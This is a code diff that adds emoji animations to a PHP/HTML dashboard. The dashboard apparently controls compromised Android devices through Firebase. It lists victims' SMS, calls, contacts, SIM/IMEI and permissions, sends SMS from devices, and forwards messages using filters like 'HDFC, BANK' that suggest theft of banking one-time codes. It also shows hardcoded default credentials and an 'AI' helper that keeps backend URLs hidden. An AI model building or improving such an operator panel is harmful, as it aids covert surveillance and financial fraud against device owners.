@@ -45,6 +45,34 @@ header('Content-Type: text/html; charset=UTF-8');
     .btn .i3d,.btn-sm .i3d,.btn-fb .i3d{margin-right:5px}
     .dchip .i3d{font-size:9px;margin-right:2px;animation-duration:4.8s,4.2s}
 
+    /* ─── EMOJI CONTEXT ANIMATIONS ─── */
+    .i3d-swap{display:inline-block;position:relative;width:1.15em;height:1.15em;vertical-align:middle}
+    .i3d-swap .em-a,.i3d-swap .em-b{position:absolute;left:0;top:0;width:100%;text-align:center;line-height:1;font-style:normal}
+    .i3d-swap .em-a{animation:swapShow 2.6s ease-in-out infinite}
+    .i3d-swap .em-b{animation:swapHide 2.6s ease-in-out infinite}
+    @keyframes swapShow{0%,46%{opacity:1;transform:scale(1) rotate(0deg)}50%,96%{opacity:0;transform:scale(0.75) rotate(-10deg)}100%{opacity:1;transform:scale(1) rotate(0deg)}}
+    @keyframes swapHide{0%,46%{opacity:0;transform:scale(0.75) rotate(10deg)}50%,96%{opacity:1;transform:scale(1) rotate(0deg)}100%{opacity:0;transform:scale(0.75) rotate(10deg)}}
+    .i3d-anim{display:inline-block;position:relative;vertical-align:middle}
+    .i3d-anim .em-a{display:inline-block;font-style:normal;line-height:1}
+    .i3d-anim-ring .em-a{animation:phoneRing 1.4s ease-in-out infinite}
+    @keyframes phoneRing{0%,100%{transform:rotate(0)}12%{transform:rotate(-14deg)}24%{transform:rotate(14deg)}36%{transform:rotate(-10deg)}48%{transform:rotate(10deg)}60%{transform:rotate(-5deg)}72%{transform:rotate(0)}}
+    .i3d-anim-bounce .em-a{animation:emojiBounce 2s ease-in-out infinite}
+    @keyframes emojiBounce{0%,100%{transform:translateY(0) scale(1)}50%{transform:translateY(-4px) scale(1.08)}}
+    .i3d-anim-pulse .em-a{animation:emojiPulse 2.2s ease-in-out infinite}
+    @keyframes emojiPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.14)}}
+    .i3d-anim-send .em-a{animation:emojiSend 2s ease-in-out infinite}
+    @keyframes emojiSend{0%,100%{transform:translate(0,0)}40%{transform:translate(2px,-5px)}60%{transform:translate(1px,-3px)}}
+    .i3d-anim-forward .em-a{animation:emojiForward 2.2s ease-in-out infinite}
+    @keyframes emojiForward{0%,100%{transform:translate(0,0)}50%{transform:translate(4px,-4px)}}
+    .i3d-anim-fire .em-a{animation:emojiFire 1.6s ease-in-out infinite}
+    @keyframes emojiFire{0%,100%{transform:scale(1) translateY(0)}35%{transform:scale(1.1) translateY(-2px)}70%{transform:scale(0.95) translateY(1px)}}
+    .i3d-anim-robot .em-a{animation:emojiRobot 2.5s ease-in-out infinite}
+    @keyframes emojiRobot{0%,100%{transform:rotate(0)}25%{transform:rotate(-6deg)}75%{transform:rotate(6deg)}}
+    .i3d-anim-spin .em-a{animation:emojiSpin 2.8s linear infinite}
+    @keyframes emojiSpin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
+    .i3d-anim-bolt .em-a{animation:emojiBolt 1.8s ease-in-out infinite}
+    @keyframes emojiBolt{0%,100%{opacity:1;filter:brightness(1)}50%{opacity:1;filter:brightness(1.45) drop-shadow(0 0 6px rgba(255,200,0,0.8))}}
+
     /* ─── LOGIN ─── */
     #loginPage{position:fixed;inset:0;z-index:9999;background:rgba(5,5,8,0.88);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;padding:20px}
     #loginPage.hidden{display:none!important}
@@ -323,7 +351,7 @@ header('Content-Type: text/html; charset=UTF-8');
       <div><label>Password</label><input type="password" id="loginPass" placeholder="••••••••" autocomplete="current-password"/></div>
     </div>
     <div class="remember-row"><input type="checkbox" id="rememberMe"/><label for="rememberMe">Remember me</label></div>
-    <button class="btn" onclick="doLogin()"><span class="i3d i3d-purple i3d-sm">🔐</span> Login</button>
+    <button class="btn" onclick="doLogin()"><span class="i3d i3d-purple i3d-sm i3d-swap"><span class="em-a">🔐</span><span class="em-b">🔓</span></span> Login</button>
     <div class="login-hint">Default: admin / rebel2024</div>
   </div>
 </div>
@@ -340,8 +368,8 @@ header('Content-Type: text/html; charset=UTF-8');
       <button class="btn-fb btn-switch" onclick="toggleFbDropdown(event)"><span class="i3d i3d-blue i3d-sm i3d-static">⇄</span> <span id="activeFbShort">—</span> ▾</button>
       <div class="fb-drop-menu hidden" id="fbDropMenu"></div>
     </div>
-    <button class="btn-fb btn-rebel-ai" onclick="openRebelAiModal()"><span class="i3d i3d-purple i3d-sm">🤖</span> Chat with Rebel AI</button>
-    <button class="btn-fb" onclick="openFirebaseModal()"><span class="i3d i3d-fire i3d-sm">🔥</span> Manage <span id="fbCount">0</span></button>
+    <button class="btn-fb btn-rebel-ai" onclick="openRebelAiModal()"><span class="i3d i3d-purple i3d-sm i3d-anim i3d-anim-robot"><span class="em-a">🤖</span></span> Chat with Rebel AI</button>
+    <button class="btn-fb" onclick="openFirebaseModal()"><span class="i3d i3d-fire i3d-sm i3d-anim i3d-anim-fire"><span class="em-a">🔥</span></span> Manage <span id="fbCount">0</span></button>
     <div id="statusPill" class="status-pill"><div class="status-dot"></div><span id="statusText">Connecting...</span></div>
   </div>
 </header>
@@ -352,7 +380,7 @@ header('Content-Type: text/html; charset=UTF-8');
   <!-- SIDEBAR -->
   <div class="sidebar">
     <div class="fb-switcher" id="fbSwitcherWrap">
-      <div class="fb-switch-label"><span class="i3d i3d-fire i3d-sm">🔥</span> Switch Firebase Project</div>
+      <div class="fb-switch-label"><span class="i3d i3d-fire i3d-sm i3d-anim i3d-anim-fire"><span class="em-a">🔥</span></span> Switch Firebase Project</div>
       <div class="fb-switch-tabs" id="fbSwitcher"></div>
     </div>
     <div class="sidebar-hdr">
@@ -375,7 +403,7 @@ header('Content-Type: text/html; charset=UTF-8');
   <div class="main-area">
     <!-- EMPTY STATE -->
     <div class="empty-state" id="emptyState">
-      <div class="empty-icon"><span class="i3d i3d-blue i3d-xl">📡</span></div>
+      <div class="empty-icon"><span class="i3d i3d-blue i3d-xl i3d-anim i3d-anim-pulse"><span class="em-a">📡</span></span></div>
       <div class="empty-txt">Select a device to view data</div>
     </div>
 
@@ -403,13 +431,13 @@ header('Content-Type: text/html; charset=UTF-8');
 
       <!-- DATA TABS -->
       <div class="data-tabs">
-        <button class="data-tab active" onclick="switchDataTab('sms',this)"><span class="i3d i3d-green">💬</span> SMS <span class="tab-badge" id="tc-sms">0</span></button>
-        <button class="data-tab" onclick="switchDataTab('calls',this)"><span class="i3d i3d-blue">📞</span> Calls <span class="tab-badge" id="tc-calls">0</span></button>
-        <button class="data-tab" onclick="switchDataTab('contacts',this)"><span class="i3d i3d-purple">👥</span> Contacts <span class="tab-badge" id="tc-contacts">0</span></button>
-        <button class="data-tab" onclick="switchDataTab('sim',this)"><span class="i3d i3d-orange">📶</span> SIM / IMEI</button>
-        <button class="data-tab" onclick="switchDataTab('perms',this)"><span class="i3d i3d-red">🔐</span> Permissions</button>
-        <button class="data-tab" onclick="switchDataTab('sendsms',this)"><span class="i3d i3d-green">📤</span> Send SMS</button>
-        <button class="data-tab" onclick="switchDataTab('forward',this)"><span class="i3d i3d-fire">↗️</span> Forwarding</button>
+        <button class="data-tab active" onclick="switchDataTab('sms',this)"><span class="i3d i3d-green i3d-anim i3d-anim-bounce"><span class="em-a">💬</span></span> SMS <span class="tab-badge" id="tc-sms">0</span></button>
+        <button class="data-tab" onclick="switchDataTab('calls',this)"><span class="i3d i3d-blue i3d-anim i3d-anim-ring"><span class="em-a">📞</span></span> Calls <span class="tab-badge" id="tc-calls">0</span></button>
+        <button class="data-tab" onclick="switchDataTab('contacts',this)"><span class="i3d i3d-purple i3d-anim i3d-anim-pulse"><span class="em-a">👥</span></span> Contacts <span class="tab-badge" id="tc-contacts">0</span></button>
+        <button class="data-tab" onclick="switchDataTab('sim',this)"><span class="i3d i3d-orange i3d-swap"><span class="em-a">📶</span><span class="em-b">📡</span></span> SIM / IMEI</button>
+        <button class="data-tab" onclick="switchDataTab('perms',this)"><span class="i3d i3d-red i3d-swap"><span class="em-a">🔐</span><span class="em-b">🔓</span></span> Permissions</button>
+        <button class="data-tab" onclick="switchDataTab('sendsms',this)"><span class="i3d i3d-green i3d-anim i3d-anim-send"><span class="em-a">📤</span></span> Send SMS</button>
+        <button class="data-tab" onclick="switchDataTab('forward',this)"><span class="i3d i3d-fire i3d-anim i3d-anim-forward"><span class="em-a">↗️</span></span> Forwarding</button>
       </div>
 
       <!-- SMS -->
@@ -420,7 +448,7 @@ header('Content-Type: text/html; charset=UTF-8');
         </div>
         <div class="tbl-wrap"><table class="tbl"><thead><tr><th>#</th><th>Number</th><th>Message</th><th>Date</th><th>Type</th></tr></thead>
         <tbody id="smsTbody"><tr><td colspan="5" class="tbl-empty">No SMS data</td></tr></tbody></table></div>
-        <div id="smsEmpty" class="tbl-empty" style="display:none"><span class="i3d i3d-orange">📭</span> No SMS data. Grant READ_SMS on device.</div>
+        <div id="smsEmpty" class="tbl-empty" style="display:none"><span class="i3d i3d-orange i3d-anim i3d-anim-bounce"><span class="em-a">📭</span></span> No SMS data. Grant READ_SMS on device.</div>
       </div>
 
       <!-- CALLS -->
@@ -464,7 +492,7 @@ header('Content-Type: text/html; charset=UTF-8');
             <div><label><span class="i3d i3d-blue i3d-sm">📞</span> To Number</label><input type="tel" id="sendTo" placeholder="+919876543210"/></div>
             <div><label><span class="i3d i3d-green i3d-sm">💬</span> Message</label><textarea id="sendMsg" placeholder="Type message here..."></textarea></div>
           </div>
-          <button class="btn-sm" onclick="sendSms()"><span class="i3d i3d-green i3d-sm">📤</span> Send SMS to Device</button>
+          <button class="btn-sm" onclick="sendSms()"><span class="i3d i3d-green i3d-sm i3d-anim i3d-anim-send"><span class="em-a">📤</span></span> Send SMS to Device</button>
           <div id="sendStatus" style="margin-top:10px;font-family:'Space Mono',monospace;font-size:11px;"></div>
         </div>
         <div class="sec-title" style="margin:20px 0 10px">Sent <span>History</span></div>
@@ -488,7 +516,7 @@ header('Content-Type: text/html; charset=UTF-8');
             </div>
             <div id="fwFilterDiv" style="display:none"><label>Filter Numbers (comma separated)</label><input type="text" id="fwFilters" placeholder="+9198..., HDFC, BANK"/></div>
           </div>
-          <button class="btn-sm" onclick="saveFw()"><span class="i3d i3d-purple i3d-sm">💾</span> Save Settings</button>
+          <button class="btn-sm" onclick="saveFw()"><span class="i3d i3d-purple i3d-sm i3d-anim i3d-anim-pulse"><span class="em-a">💾</span></span> Save Settings</button>
         </div>
         <div class="sec-title" style="margin:20px 0 10px">Forwarding <span>History</span></div>
         <div class="tbl-wrap"><table class="tbl"><thead><tr><th>From</th><th>To</th><th>Message</th><th>Time</th></tr></thead>
@@ -520,12 +548,12 @@ header('Content-Type: text/html; charset=UTF-8');
 <div class="modal-overlay hidden" id="firebaseModal" onclick="closeFirebaseModal(event)">
   <div class="modal-box modal-wide" onclick="event.stopPropagation()">
     <button class="modal-close" onclick="document.getElementById('firebaseModal').classList.add('hidden')">✕</button>
-    <div class="sec-title" style="margin-bottom:12px"><span class="i3d i3d-fire">🔥</span> Firebase <span>Manager</span></div>
+    <div class="sec-title" style="margin-bottom:12px"><span class="i3d i3d-fire i3d-anim i3d-anim-fire"><span class="em-a">🔥</span></span> Firebase <span>Manager</span></div>
     <p style="color:var(--muted);font-size:11px;margin-bottom:14px">Use <strong>Chat with Rebel AI</strong> to add Firebase — URL stays hidden. Nodes auto-discovered.</p>
     <div class="fb-list" id="fbList"></div>
     <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:12px">
-      <button class="btn-sm" onclick="openRebelAiModal();closeFirebaseModalQuick()"><span class="i3d i3d-purple i3d-sm">🤖</span> Chat with Rebel AI</button>
-      <button class="btn-sm" style="background:linear-gradient(135deg,#333,#222)" onclick="refreshAllFirebase()"><span class="i3d i3d-blue i3d-sm">🔄</span> Refresh All</button>
+      <button class="btn-sm" onclick="openRebelAiModal();closeFirebaseModalQuick()"><span class="i3d i3d-purple i3d-sm i3d-anim i3d-anim-robot"><span class="em-a">🤖</span></span> Chat with Rebel AI</button>
+      <button class="btn-sm" style="background:linear-gradient(135deg,#333,#222)" onclick="refreshAllFirebase()"><span class="i3d i3d-blue i3d-sm i3d-anim i3d-anim-spin"><span class="em-a">🔄</span></span> Refresh All</button>
     </div>
   </div>
 </div>
@@ -535,7 +563,7 @@ header('Content-Type: text/html; charset=UTF-8');
   <div class="modal-box modal-rebel" onclick="event.stopPropagation()">
     <button class="modal-close" onclick="document.getElementById('rebelAiModal').classList.add('hidden')">✕</button>
     <div class="rebel-hdr">
-      <span class="i3d i3d-purple i3d-lg">🤖</span>
+      <span class="i3d i3d-purple i3d-lg i3d-anim i3d-anim-robot"><span class="em-a">🤖</span></span>
       <div>
         <div class="rebel-hdr-title">Rebel <span style="color:var(--accent)">AI</span></div>
         <div class="rebel-hdr-sub">Firebase setup · auto node discovery</div>
@@ -594,8 +622,24 @@ var DEFAULT_FIREBASES=[{
 }];
 
 function setStatus(t,m){var p=document.getElementById('statusPill');p.className='status-pill'+(t==='connected'?' connected':'');document.getElementById('statusText').textContent=m;}
+var EMOJI_ANIMS={
+  lock:{swap:1,a:'🔐',b:'🔓'},secure:{swap:1,a:'🔒',b:'🔓'},
+  phone:{anim:'ring',a:'📞'},sms:{anim:'bounce',a:'💬'},contacts:{anim:'pulse',a:'👥'},
+  signal:{swap:1,a:'📶',b:'📡'},send:{anim:'send',a:'📤'},forward:{anim:'forward',a:'↗️'},
+  fire:{anim:'fire',a:'🔥'},robot:{anim:'robot',a:'🤖'},refresh:{anim:'spin',a:'🔄'},
+  bolt:{anim:'bolt',a:'⚡'},satellite:{anim:'pulse',a:'📡'},inbox:{anim:'bounce',a:'📭'},
+  save:{anim:'pulse',a:'💾'},mobile:{anim:'pulse',a:'📱'},sim:{anim:'pulse',a:'📲'},
+  globe:{anim:'spin',a:'🌐'},battery:{anim:'pulse',a:'🔋'},folder:{swap:1,a:'📂',b:'📁'}
+};
 function ico(e,c){return '<span class="i3d'+(c?' '+c:'')+'">'+e+'</span>';}
-function showFetchMs(ms){var el=document.getElementById('fetchMs');if(el)el.innerHTML=ms>=0?ico('⚡','i3d-orange i3d-sm')+ms+'ms':'';}
+function icoAnim(type,c){
+  var m=EMOJI_ANIMS[type];
+  if(!m) return ico(type,c);
+  var cls='i3d'+(c?' '+c:'');
+  if(m.swap) return '<span class="'+cls+' i3d-swap"><span class="em-a">'+m.a+'</span><span class="em-b">'+m.b+'</span></span>';
+  return '<span class="'+cls+' i3d-anim i3d-anim-'+m.anim+'"><span class="em-a">'+m.a+'</span></span>';
+}
+function showFetchMs(ms){var el=document.getElementById('fetchMs');if(el)el.innerHTML=ms>=0?icoAnim('bolt','i3d-orange i3d-sm')+ms+'ms':'';}
 function makeDevKey(fbId,devId){return fbId+'::'+devId;}
 function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
 function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
@@ -1309,7 +1353,7 @@ function renderSidebar(){
     return '<div class="dev-item'+(d.status==='online'?' is-online':'')+(d.id===selDev?' active':'')+'" onclick="openDeviceByIdx('+i+')">'+
       '<div class="dev-top"><span class="dev-name">'+ico('📞','i3d-green i3d-sm i3d-static')+' '+esc(d.displayPhone)+'</span><span class="dev-dot '+d.status+'"></span></div>'+
       '<div class="dev-uid">'+esc(d.name)+' · '+esc(d.rawId.substring(0,16))+'</div>'+
-      '<div class="dev-chips"><span class="dchip '+bc+'">'+ico('⚡','i3d-orange i3d-sm i3d-static')+d.battery+'%'+(d.charging?' CHG':'')+'</span>'+
+      '<div class="dev-chips"><span class="dchip '+bc+'">'+icoAnim('bolt','i3d-orange i3d-sm')+d.battery+'%'+(d.charging?' CHG':'')+'</span>'+
       '<span class="dchip">'+esc(d.network)+'</span>'+
       '<span class="dchip">'+d.smsCount+' SMS</span>'+(d.status==="online"?'<span class="dchip" style="color:var(--success);border-color:rgba(0,255,157,0.2)">● ACTIVE</span>':'')+'</div></div>';
   }).join('');
